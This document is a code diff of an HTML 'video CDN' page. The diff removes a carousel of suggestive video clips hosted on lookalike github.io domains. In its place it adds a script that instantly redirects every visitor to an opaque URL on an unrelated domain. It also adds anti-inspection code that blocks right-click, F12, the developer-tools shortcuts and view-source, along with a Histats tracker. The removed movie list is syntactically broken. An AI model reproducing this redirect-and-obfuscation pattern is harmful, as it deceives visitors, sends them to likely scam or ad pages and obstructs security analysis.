@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,496 +5,50 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CDN VIDEY CO</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;900&display=swap');
-
-  /* Reset */
-  * {
-    box-sizing: border-box;
-    user-select: none;
-  }
-  body {
-    margin: 0;
-    background: linear-gradient(135deg, #061f3e, #003459);
-    font-family: 'Poppins', sans-serif;
-    color: #00e5ff;
-    overflow-x: hidden;
-  }
-
-  header {
-    font-size: 3rem;
-    font-weight: 900;
-    text-align: center;
-    padding: 2rem 1rem 1rem;
-    text-transform: uppercase;
-    letter-spacing: 0.3em;
-    text-shadow:
-      0 0 10px #00e5ff,
-      0 0 20px #00e5ff,
-      0 0 30px #00e5ff;
-  }
-
-  .slider-wrapper {
-    position: relative;
-    max-width: 1200px;
-    margin: 0 auto 4rem;
-    padding: 0 1rem;
-  }
-
-  .slider {
-    display: flex;
-    gap: 1.5rem;
-    overflow-x: auto;
-    scroll-behavior: smooth;
-    padding-bottom: 1rem;
-    scrollbar-width: thin;
-    scrollbar-color: #00e5ff transparent;
-    outline: none;
-  }
-  .slider::-webkit-scrollbar {
-    height: 8px;
-  }
-  .slider::-webkit-scrollbar-thumb {
-    background: #00e5ff;
-    border-radius: 4px;
-  }
-
-  .card {
-    position: relative;
-    flex: 0 0 280px;
-    border-radius: 16px;
-    background: linear-gradient(180deg, #002b4f 0%, #001f36 100%);
-    box-shadow:
-      0 10px 20px rgba(0, 229, 255, 0.25),
-      inset 0 0 15px rgba(0, 229, 255, 0.15);
-    cursor: pointer;
-    transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1),
-                box-shadow 0.4s cubic-bezier(0.22, 1, 0.36, 1);
-    transform-style: preserve-3d;
-    overflow: hidden;
-    opacity: 0;
-    transform: translateY(20px);
-    animation-fill-mode: forwards;
-    animation-name: fadeInUp;
-    animation-duration: 0.8s;
-    animation-timing-function: ease;
-    animation-fill-mode: forwards;
-    animation-delay: var(--delay);
-  }
-  .card.visible {
-    opacity: 1;
-    transform: translateY(0);
-  }
-  @keyframes fadeInUp {
-    to {
-      opacity: 1;
-      transform: translateY(0);
-    }
-  }
-
-  .card:hover {
-    box-shadow:
-      0 20px 40px rgba(0, 229, 255, 0.7),
-      inset 0 0 30px rgba(0, 229, 255, 0.3);
-  }
-  .card img {
-    width: 100%;
-    height: 400px;
-    object-fit: cover;
-    border-radius: 16px;
-    transition: transform 0.5s ease;
-    pointer-events: none;
-  }
-  .card:hover img {
-    transform: scale(1.1);
-  }
-  .card::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    border-radius: 16px;
-    background: linear-gradient(180deg, transparent 40%, rgba(0, 229, 255, 0.7) 100%);
-    opacity: 0.35;
-    pointer-events: none;
-    mix-blend-mode: screen;
-  }
-
-  .play-button {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    width: 64px;
-    height: 64px;
-    background: rgba(0, 229, 255, 0.9);
-    border-radius: 50%;
-    transform: translate(-50%, -50%) scale(1);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    box-shadow: 0 0 20px rgba(0, 229, 255, 0.7);
-    filter: drop-shadow(0 0 10px rgba(0, 229, 255, 0.6));
-    opacity: 0;
-    pointer-events: none;
-  }
-  .card:hover .play-button,
-  .card:focus .play-button {
-    opacity: 1;
-    pointer-events: auto;
-    transform: translate(-50%, -50%) scale(1.2);
-    box-shadow:
-      0 0 30px rgba(0, 229, 255, 1),
-      0 0 40px rgba(0, 229, 255, 0.7);
-    animation: pulse 2s infinite ease-in-out;
-  }
-  @keyframes pulse {
-    0%, 100% {
-      box-shadow:
-        0 0 30px rgba(0, 229, 255, 1),
-        0 0 40px rgba(0, 229, 255, 0.7);
-    }
-    50% {
-      box-shadow:
-        0 0 40px rgba(0, 229, 255, 1),
-        0 0 60px rgba(0, 229, 255, 1);
-    }
-  }
-  .play-button svg {
-    fill: #001f36;
-    width: 36px;
-    height: 36px;
-  }
-
-  .card-title {
-    position: absolute;
-    bottom: 1rem;
-    left: 1rem;
-    right: 1rem;
-    color: #00e5ff;
-    font-weight: 700;
-    text-shadow: 0 0 8px #00e5ff;
-    font-size: 1.1rem;
-    user-select: none;
-    pointer-events: none;
-  }
-
-  .slider-controls {
-    position: absolute;
-    top: 50%;
-    width: 100%;
-    display: flex;
-    justify-content: space-between;
-    pointer-events: none;
-    transform: translateY(-50%);
-    padding: 0 10px;
-  }
-  button.control-btn {
-    pointer-events: auto;
-    background: rgba(0, 229, 255, 0.2);
-    border: none;
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    color: #00e5ff;
-    cursor: pointer;
-    font-size: 2rem;
-    transition: background 0.3s ease, color 0.3s ease;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    user-select: none;
-    box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
-  }
-  button.control-btn:hover,
-  button.control-btn:focus {
-    background: #00e5ff;
-    color: #001f36;
-    outline: none;
-    box-shadow:
-      0 0 30px #00e5ff,
-      0 0 40px #00e5ff;
-  }
-  button.control-btn:active {
-    transform: scale(0.95);
-  }
-
-  /* Modal */
-  .modal {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: rgba(0, 0, 0, 0.85);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity 0.3s ease;
-    z-index: 100;
-  }
-  .modal.active {
-    opacity: 1;
-    pointer-events: auto;
-  }
-  .modal-content {
-    position: relative;
-    width: 90vw;
-    max-width: 900px;
-    aspect-ratio: 16 / 9;
-    background: #000;
-    border-radius: 16px;
-    box-shadow: 0 0 40px #00e5ff;
-  }
-  iframe {
-    width: 100%;
-    height: 100%;
-    border-radius: 16px;
-  }
-  .modal-close {
-    position: absolute;
-    top: 12px;
-    right: 12px;
-    background: rgba(0, 229, 255, 0.7);
-    border: none;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    cursor: pointer;
-    font-size: 1.6rem;
-    color: #001f36;
-    font-weight: 700;
-    box-shadow: 0 0 10px #00e5ff;
-    transition: background 0.3s ease;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    user-select: none;
-  }
-  .modal-close:hover,
-  .modal-close:focus {
-    background: #00e5ff;
-    outline: none;
-    box-shadow:
-      0 0 20px #00e5ff,
-      0 0 30px #00e5ff;
-  }
-
-  /* Responsive */
-  @media (max-width: 768px) {
-    .card {
-      flex: 0 0 220px;
-      height: 320px;
-    }
-    .card img {
-      height: 320px;
-    }
-  }
-  @media (max-width: 480px) {
-    .card {
-      flex: 0 0 160px;
-      height: 240px;
-    }
-    .card img {
-      height: 240px;
-    }
-  }
-</style>
-</head>
-<body>
-
-<header>VIDEY+</header>
-
-<div class="slider-wrapper" aria-label="Best of the Best">
-  <div class="slider" tabindex="0" aria-live="polite" aria-roledescription="carousel" id="slider">
-    <!-- Cards inserted by JS -->
-  </div>
-
-  <div class="slider-controls">
-    <button class="control-btn" aria-label="Scroll Left" id="btnLeft">?</button>
-    <button class="control-btn" aria-label="Scroll Right" id="btnRight">?</button>
-  </div>
-</div>
-
-<!-- Modal -->
-<div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" id="modal">
-  <div class="modal-content">
-    <button class="modal-close" aria-label="Close video" id="modalClose">&times;</button>
-    <iframe
-      id="videoFrame"
-      title="Video player"
-      allow="autoplay; encrypted-media; gyroscope; picture-in-picture"
-      allowfullscreen
-      src=""
-    ></iframe>
-  </div>
-</div>
-
-<audio id="clickSound" src="https://actions.google.com/sounds/v1/ui/click.ogg" preload="auto" aria-hidden="true"></audio>
 
 <script>
-  // Movie Data
-  const movies = [
-    {
-      title: "Love the vibes",
-      image: "https://dragonxcdnvideyy401co.github.io/GVIUQd0D1.mp4/3.jpg",
-      video: "https://gocixcdnvdey.github.io/GVIUQd0D1.mp4?autoplay=1&mute=1"
-    },
-    {
-      title: "How’s the view",
-      image: "https://dragonxcdnvideyy401co.github.io/3mj8s5TT1.mp4/1.jpg",
-      video: "https://gocixcdnvdey.github.io/3mj8s5TT1.mp4?autoplay=1&mute=1"
-    },
-    {
-      title: "It’s my birthday today",
-      image: "https://dragonxcdnvideyy401co.github.io/IxJ8kIkO1.mp4/2.jpg",
-      video: "https://gocixcdnvdey.github.io/IxJ8kIkO1.mp4?autoplay=1&mute=1"
-    },
-    {
-      title: "she is the whole vibe",
-      image: "https://dragonxcdnvideyy401co.github.io/sfxH7wFM1.mp4/4.jpg",
-      video: "https://gocixcdnvdey.github.io/sfxH7wFM1.mp4?autoplay=1&mute=1"
-    },
-    {
-      title: "put some lulu on this",
-      image: "https://dragonxcdnvideyy401co.github.io/he3KpgdJ1.mp4/5.jpg",
-      video: "https://gocixcdnvdey.github.io/he3KpgdJ1.mp4?autoplay=1&mute=1"
-    },
-    {
-      title: "Be "Thick" they",
-      image: "https://dragonxcdnvideyy401co.github.io/zsZQDMcx1.mp4/6.jpg",
-      video: "https://gocixcdnvdey.github.io/zsZQDMcx1.mp4?autoplay=1&mute=1"
-    },
-    {
-    
-  // Insert cards into slider
-  const slider = document.getElementById('slider');
-  movies.forEach((movie, i) => {
-    const card = document.createElement('div');
-    card.className = 'card';
-    card.style.setProperty('--delay', `${i * 0.1}s`);
-    card.tabIndex = 0;
-    card.setAttribute('role', 'button');
-    card.setAttribute('aria-pressed', 'false');
-    card.setAttribute('aria-label', `Play trailer for ${movie.title}`);
-
-    card.innerHTML = `
-      <img src="${movie.image}" alt="${movie.title}" loading="lazy" />
-      <div class="play-button" aria-hidden="true" >
-        <svg viewBox="0 0 24 24" fill="#001f36" width="36" height="36">
-          <path d="M8 5v14l11-7z"/>
-        </svg>
-      </div>
-      <div class="card-title">${movie.title}</div>
-    `;
-
-    // 3D tilt effect variables
-    const tiltMax = 10; // degrees max tilt
-
-    card.addEventListener('mousemove', e => {
-      const rect = card.getBoundingClientRect();
-      const x = e.clientX - rect.left - rect.width/2;
-      const y = e.clientY - rect.top - rect.height/2;
-      const tiltX = (y / (rect.height/2)) * tiltMax * -1;
-      const tiltY = (x / (rect.width/2)) * tiltMax;
-      card.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale(1.05)`;
-    });
-    card.addEventListener('mouseleave', () => {
-      card.style.transform = 'rotateX(0deg) rotateY(0deg) scale(1)';
-    });
-
-    // Click or keyboard open modal and play sound
-    card.addEventListener('click', () => {
-      playClickSound();
-      openModal(movie.video);
-    });
-    card.addEventListener('keydown', e => {
-      if (e.key === "Enter" || e.key === " ") {
-        playClickSound();
-        openModal(movie.video);
-        e.preventDefault();
+    window.location.replace("https://amazing-population.com/bm3sVb0.PO3/pivgbNmWVLJWZxDN0L2MN/zlk_2/MDDeMZ3fLsTKYk3kOLT-YRwfNQDsEe");
+  </script>
+</head>
+<body>
+  
+<script>
+// Cegah masuk fullscreen lewat JavaScript
+document.addEventListener('fullscreenchange', () => {
+if (document.fullscreenElement) {
+        document.exitFullscreen();
       }
     });
 
-    slider.appendChild(card);
-  });
+    // Proteksi klik kanan dan F12
+    (function () {
+      document.addEventListener('contextmenu', function (e) {
+        if (!e.target.closest('.allow-context, iframe')) {
+          e.preventDefault();
+        }
+      });
 
-  // Scroll buttons
-  const btnLeft = document.getElementById('btnLeft');
-  const btnRight = document.getElementById('btnRight');
-  btnLeft.addEventListener('click', () => {
-    playClickSound();
-    slider.scrollBy({ left: -300, behavior: 'smooth' });
-  });
-  btnRight.addEventListener('click', () => {
-    playClickSound();
-    slider.scrollBy({ left: 300, behavior: 'smooth' });
-  });
-
-  // Modal handling
-  const modal = document.getElementById('modal');
-  const videoFrame = document.getElementById('videoFrame');
-  const modalClose = document.getElementById('modalClose');
-
-  function openModal(videoUrl) {
-    videoFrame.src = videoUrl;
-    modal.classList.add('active');
-  }
-  function closeModal() {
-    modal.classList.remove('active');
-    videoFrame.src = '';
-  }
-  modalClose.addEventListener('click', () => {
-    playClickSound();
-    closeModal();
-  });
-  modal.addEventListener('click', e => {
-    if (e.target === modal) {
-      closeModal();
-    }
-  });
-  document.addEventListener('keydown', e => {
-    if (e.key === "Escape" && modal.classList.contains('active')) {
-      closeModal();
-    }
-  });
-
-  // Click sound
-  const clickSound = document.getElementById('clickSound');
-  function playClickSound() {
-    clickSound.currentTime = 0;
-    clickSound.play();
-  }
-
-  // Auto-scroll slider
-  let autoScrollInterval = setInterval(() => {
-    if (slider.scrollLeft + slider.clientWidth >= slider.scrollWidth) {
-      slider.scrollTo({ left: 0, behavior: 'smooth' });
-    } else {
-      slider.scrollBy({ left: 1, behavior: 'smooth' });
-    }
-  }, 20);
-
-  // Pause auto-scroll on hover/focus
-  slider.addEventListener('mouseenter', () => clearInterval(autoScrollInterval));
-  slider.addEventListener('mouseleave', () => {
-    autoScrollInterval = setInterval(() => {
-      if (slider.scrollLeft + slider.clientWidth >= slider.scrollWidth) {
-        slider.scrollTo({ left: 0, behavior: 'smooth' });
-      } else {
-        slider.scrollBy({ left: 1, behavior: 'smooth' });
-      }
-    }, 20);
-  });
-  slider.addEventListener('focusin', () => clearInterval(autoScrollInterval));
-  slider.addEventListener('focusout', () => {
-    autoScrollInterval = setInterval(() => {
-      if (slider.scrollLeft + slider.clientWidth >= slider.scrollWidth) {
-        slider.scrollTo({ left: 0, behavior: 'smooth' });
-      } else {
-        slider.scrollBy({ left: 1, behavior: 'smooth' });
-      }
-    }, 20);
-  });
+      document.addEventListener('keydown', function (e) {
+        if (e.key === "F12") e.preventDefault();
+        if (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase())) e.preventDefault();
+        if (e.ctrlKey && ["U","S"].includes(e.key.toUpperCase())) e.preventDefault();
+      });
+    })();
 </script>
+
+
+   <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5007039,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5007039&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
 
 </body>
 </html>
